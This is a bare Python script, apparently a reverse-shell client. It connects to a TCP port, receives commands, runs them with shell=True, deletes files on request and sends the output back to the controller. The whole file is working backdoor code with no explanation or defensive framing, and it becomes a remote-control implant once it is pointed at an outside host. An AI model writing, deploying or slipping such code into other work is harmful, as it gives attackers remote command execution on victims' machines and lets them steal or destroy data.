import socket
import subprocess
import os

host = socket.gethostname()
port = 12345

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    current_directory = os.getcwd()
    print(host)

    while True:
        command = client.recv(4096).decode()
        if command == 'exit':
            client.close()
            exit(0)
        elif command.startswith("cd "):
            try:
                path = command.split(" ")[1]
                os.chdir(path)
                current_directory = os.getcwd()
                client.send(current_directory.encode())
            except Exception as e:
                client.send(str(e).encode())
        elif command.startswith("del "):
            filename = command.split(" ")[1]
            try:
                os.remove(filename)
                client.send(b"File deleted successfully.")
            except Exception as e:
                client.send(str(e).encode())
        else:
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
                client.send(result)
                client.send(str("\n").encode())
            except Exception as e:
                client.send(str(e).encode())

if __name__ == "__main__":
    main()
